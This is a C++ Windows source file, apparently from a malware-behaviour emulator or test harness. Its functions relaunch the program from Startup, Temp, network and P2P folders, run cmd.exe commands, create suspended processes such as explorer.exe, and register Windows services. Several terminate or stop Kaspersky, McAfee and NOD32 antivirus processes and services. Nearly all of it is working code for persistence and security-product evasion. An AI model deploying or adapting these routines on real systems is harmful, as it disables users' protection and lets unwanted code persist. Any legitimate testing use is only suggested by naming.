#include "stdafx.h"
#include "all_func_def.h"
#include "..\set_hooker\serverprotocol.h"

SOCKET g_ClientSocket = 0;
DWORD WINAPI NetClientThreadProc(LPVOID lpParameter);
bool RegisterServiceBySCM(const char * l_ServName, const char * l_FullFileName);

///////////////////////////////////////////////////////////////
//	function to create another self copy of process (from current folder)
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromCurFolder()
{
	printf("CreateProcessSelfFromCurFolder::start\n");
	return CreateProcessSelfFromCurFolderEx();
}
void RegisterServiceBySCMEx(const char * Param1, const char * Param2, const char * Param3)
{
	RegisterServiceBySCM(Param1, Param2);
}
///////////////////////////////////////////////////////////////
//	function to create another self copy of process (from %LocalDestFolder% folder)
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromDestFolder()
{
	printf("CreateProcessSelfFromDestFolder::start\n");
	char SelfFullPath[MAX_PATH];
	char * FileName = 0;
	if (!GetSelfFullPath(&SelfFullPath[0], &FileName)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", LocalDestFolder, FileName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another process (test_exe) (from %LocalDestFolder% folder)
///////////////////////////////////////////////////////////////
void CreateProcessExeFromDestFolder()
{
	printf("CreateProcessExeFromDestFolder::start\n");
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", LocalDestFolder, TestExeName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another process (test_exe) (from %LocalDestFolder% folder)
///////////////////////////////////////////////////////////////
void CreateProcessExeFromDestFolderEx(const char * Param1, const char * Param2, const char * Param3)
{
	printf("CreateProcessExeFromDestFolderEx::start\n");
	if (Param1 == 0)
		return CreateProcessExeFromDestFolder();
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", LocalDestFolder, Param1);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another process (set_hooker) (from %LocalDestFolder% folder)
///////////////////////////////////////////////////////////////
void CreateProcessHookerFromDestFolder()
{
	printf("CreateProcessHookerFromDestFolder::start\n");
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", LocalDestFolder, SetHookerName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another self copy of process (from %Network% folder)
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromNetFolder()
{
	printf("CreateProcessSelfFromNetFolder::start\n");
	char SelfFullPath[MAX_PATH];
	char * FileName = 0;
	if (!GetSelfFullPath(&SelfFullPath[0], &FileName)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", NetworkDestFolder, FileName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another self copy of process (from %LocalP2PFolder% folder)
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromP2PFolder()
{
	printf("CreateProcessSelfFromP2PFolder::start\n");
	char SelfFullPath[MAX_PATH];
	char * FileName = 0;
	if (!GetSelfFullPath(&SelfFullPath[0], &FileName)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	char DestFullPath[MAX_PATH];
	sprintf(DestFullPath, "%s\\%s", LocalP2PFolder, FileName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	function to create another self copy of process (from %StartUp% folder)
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromStartupFolder()
{
	printf("CreateProcessSelfFromStartupFolder::start\n");
	char SelfFullPath[MAX_PATH];
	char * FileName = 0;
	if (!GetSelfFullPath(&SelfFullPath[0], &FileName)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	char DestFullPath[MAX_PATH];
	if (!GetSpecialFolder(CSIDL_STARTUP, DestFullPath))
		return;
	sprintf(DestFullPath, "%s\\%s", DestFullPath, FileName);
	CreateProcessFromSpecifiedFileName(DestFullPath);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromTemp()
{
	printf("SelfCopyToTemp::start\n");
	HRESULT hRes = S_OK;
	char SelfFullPath[MAX_PATH];
	char * FileName = 0;
	if (!GetSelfFullPath(&SelfFullPath[0], &FileName)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	char SpecialFolder[MAX_PATH];
	if(S_OK != (hRes = SHGetFolderPathA( NULL, 
								 CSIDL_PROFILE, 
								 NULL, 
								 0, 
								 SpecialFolder))) {
		printf("SHGetFolderPathA fail (%x)\n", hRes);
		return;
	}
	sprintf(SpecialFolder, "%s\\Local Settings\\Temp\\%s", SpecialFolder, FileName);
	CreateProcessFromSpecifiedFileName(SpecialFolder, "CREATE_ARRV_SELF_TO_CF NOT_TO_CLEAR");
	return;
}
///////////////////////////////////////////////////////////////
//	create IE process
///////////////////////////////////////////////////////////////
void CreateProcessIE()
{
	printf("CreateProcessIE::start\n");
	char IEPath[MAX_PATH];
	if (GetIEPathFromRegistry(IEPath, sizeof(IEPath))) {
		CreateProcessFromSpecifiedFileName(IEPath);
	}
	return;
}

///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessRDRFromDestFolder()
{
	printf("CreateProcessRDRFromDestFolder::start\n");
	char DestFullPath[MAX_PATH];
	char SelfFullPath[MAX_PATH];
	if (!GetSelfFullPath(&SelfFullPath[0], 0, DestFullPath)) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	sprintf(DestFullPath, "%s\\%s", DestFullPath/*LocalDestFolder*/, SetHookerName);
	CreateProcessFromSpecifiedFileName(DestFullPath, "rdr");

	HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); 
	DWORD id;
	HANDLE hThread = CreateThread(0, 0, NetClientThreadProc, hStdout, 0, &id);
	Sleep(2000);
	//char Buff[100];
	//while (cin >> Buff) {
	//	if (strcmp(Buff, "111") == 0)
	//		break;
	//	else {
	//		if (g_ClientSocket)
	//			SendTo(g_ClientSocket, Buff);
	//	}
	//}
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessCMDEx(const char * Param1, const char * Param2, const char * Param3)
{
	char CommandLine[MAX_PATH];
	if (!GetSpecialFolder(CSIDL_SYSTEM, CommandLine))
		return;
	sprintf(CommandLine, 
		(Param1) ? "%s\\cmd.exe /c %s" : "%s\\cmd.exe",
		CommandLine,
		(Param1) ? Param1 : "");
	CreateProcessFromSpecifiedFileName(CommandLine);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessEx(const char * Param1, const char * Param2, const char * Param3)
{
	printf("CreateProcessEx::start\n");
	if (Param1 == 0) {
		printf("CreateProcessEx:: Param1 == 0 \n");
		return;
	}
	char CommandLine[MAX_PATH];
	sprintf(CommandLine, "\"%s\"%s%s%s%s",
		Param1,
		Param2 ? " ":"", Param2 ? Param2:"",
		Param3 ? " ":"", Param3 ? Param3:"");
	CreateProcessFromSpecifiedFileName(CommandLine);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessSuspEx(const char * Param1, const char * Param2, const char * Param3)
{
	printf("CreateProcessSuspEx::start\n");
	if (Param1 == 0) {
		printf("CreateProcessSuspEx:: Param1 == 0 \n");
		return;
	}
	char CommandLine[MAX_PATH];
	sprintf(CommandLine, "\"%s\"%s%s%s%s",
		Param1,
		Param2 ? " ":"", Param2 ? Param2:"",
		Param3 ? " ":"", Param3 ? Param3:"");
	CreateProcessFromSpecifiedFileName(CommandLine, 0, false, true);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillProcessByNameEx(const char * Param1, const char * Param2, const char * Param3)
{
	printf("KillProcessByNameEx::start\n");
	if (Param1 == 0) {
		printf("KillProcessByNameEx:: Param1 == 0 \n");
		return;
	}
	if (strstr(Param1, "\\") != 0) {
		//	file name with path
		KillProcessByFullFileName(Param1);
	}
	else {
		//	only file name
		KillProcessByFullFileName(Param1, true);
	}
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillProcessRDR()
{
	printf("KillProcessRDR::start\n");
	KillProcessByFullFileName(SetHookerName, true);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillProcessAVP()
{
	printf("KillProcessAVP::start\n");
	KillProcessByFullFileName("avp.exe", true);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillServiceAVP()
{
	printf("KillServiceAVP::start\n");
	CreateProcessFromSpecifiedFileName("\"c:\\program files\\Kaspersky Lab\\Kaspersky Internet Security 7.0\\avp.exe\"", "stop avp");
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillProcessMcAfee()
{
	printf("KillProcessMcAfee::start\n");
	KillProcessByFullFileName("mcshield.exe", true);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillServiceMcAfee()
{
	printf("KillServiceMcAfee::start\n");
	CreateProcessFromSpecifiedFileName("\"c:\\program files\\mcafee.com\\personal firewall\\MPFService.exe\"", "stop MpfService");
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillProcessNOD()
{
	printf("KillProcessNOD::start\n");
	KillProcessByFullFileName("NOD32Service", true);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void KillServiceNOD()
{
	printf("KillServiceNOD::start\n");
	CreateProcessFromSpecifiedFileName("\"c:\\program files\\Eset\\nod32krn.exe\"", "stop NOD32krn");
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
void CreateProcessSuspendedExplorer()
{
	//char Path[MAX_PATH];
	//if (!GetSpecialFolder(CSIDL_WINDOWS, Path))
	//	return;
	//sprintf(Path, "c:\\windows\\%s", "explorer.exe");
	
	CreateProcessFromSpecifiedFileName("c:\\windows\\explorer.exe", 0, false, true);
	return;
}
///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////
//		SERVISE FUNCTIONS
///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////
//	service function to rollbacl all system operations
///////////////////////////////////////////////////////////////
void RollBackProcessOperations()
{
	KillProcessRDR();
	return;
}
///////////////////////////////////////////////////////////////
//	service function to create another self copy of process (from current folder)
//	with Command param
///////////////////////////////////////////////////////////////
void CreateProcessSelfFromCurFolderEx(char * Command, bool NotToClear)
{
	char SelfFullPath[MAX_PATH];
	if (!GetSelfFullPath(&SelfFullPath[0])) {
		printf("GetSelfFullPath:: fail\n");
		return;
	}
	CreateProcessFromSpecifiedFileName(SelfFullPath, Command, NotToClear);
	return;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
DWORD WINAPI NetClientThreadProc(LPVOID lpParameter)
{
	char CompName[MAX_PATH];
	DWORD size = MAX_PATH;
	GetComputerNameA(CompName, &size);

	g_ClientSocket = InitClientSocket(CompName, 1000);
	char Buffer[BUFFER_LENGTH];
	DWORD dwWritten = 0;
	while (1) {
		RecvFrom(g_ClientSocket, &Buffer[0]);
		WriteFile(lpParameter, Buffer, strlen(Buffer), &dwWritten, 0);
	}
	return 0;
}      
///////////////////////////////////////////////////////////////
//	service function to create process by cpecified file name
///////////////////////////////////////////////////////////////
bool CreateProcessFromSpecifiedFileName(char * ProcessName, char * Command, bool NotToClear, bool IsSuspended)
{
	if (ProcessName == 0)
		return false;
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

	char FullCommandLine[MAX_PATH];

	bool IsSelfLaunch = (strstr(ProcessName, "runme.exe") != 0);

	sprintf(FullCommandLine, "%s%s%s%s%s%s%s",
				ProcessName,
				(g_IsFromEmul&&IsSelfLaunch) ? " " : "",
				(g_IsFromEmul&&IsSelfLaunch) ? "FROM_EMUL" : "",
				Command ? " " : "",
				Command ? Command : "",
				NotToClear ? " " : "",
				NotToClear ? NotToClearStr : "");
	BOOL bRes = CreateProcessA(0, FullCommandLine, 0, 0, FALSE,
		(IsSuspended) ? (NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED) : (NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE),
		0, 0, &si, &pi);
	if (bRes != TRUE) {
		printf("CreateProcess failed (%d)\n", GetLastError());
		return false;
	}
	Sleep(500);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
	return true;
}
///////////////////////////////////////////////////////////////
//	service function to terminate process by cpecified file name
///////////////////////////////////////////////////////////////
bool KillProcessByFullFileName(const char * l_FullFileName, bool IsByShortName, bool FirstOnly)
{
	DWORD PID = 0;
	DWORD PIDArr[10];
	DWORD PIDCount = 0;
	GetPidByFullFileName(l_FullFileName, IsByShortName, &PIDArr[0], &PIDCount);
	//if (FirstOnly)
	//	//PID = GetPidByFullFileName(l_FullFileName, IsByShortName);
	//else 
	//	PID = GetPidByFullFileName(l_FullFileName, IsByShortName, &PIDArr[0], &PIDCount);
	for (UINT i = 0; i < PIDCount; i++) {
		//if (PID != 0) {
		if (PIDArr[i] != 0) {
			HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, PIDArr[i]/*PID*/);
			if (hProc) {
				if (!TerminateProcess(hProc, 0)) {
					printf("TerminateProcess fail (%d)", GetLastError());
				}
				Sleep(100);
				CloseHandle(hProc);
				if (FirstOnly)
					break;
			}
			else {
				printf("OpenProcess(PROCESS_TERMINATE) fail (%d)", GetLastError());
			}
		}
	}
	return true;
}
///////////////////////////////////////////////////////////////
//	service function to 
///////////////////////////////////////////////////////////////
bool RegisterServiceBySCM(const char * l_ServName, const char * l_FullFileName)
{
	SC_HANDLE hSCM = OpenSCManager(0, 0, 2);
	SC_HANDLE hService = 0;
	DWORD dwErr = 0;
	if (hSCM)
	{
		hService = CreateService(
			hSCM,
			l_ServName,
			l_ServName,
			0x0, 0x110, 0x2, 0x0,
			l_FullFileName,
			0x00000000, NULL, 0x00000000, 0x00000000, 0x00000000);
		if (hService == 0) 
		{
			dwErr = GetLastError();
		}
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
	}
	return true;
}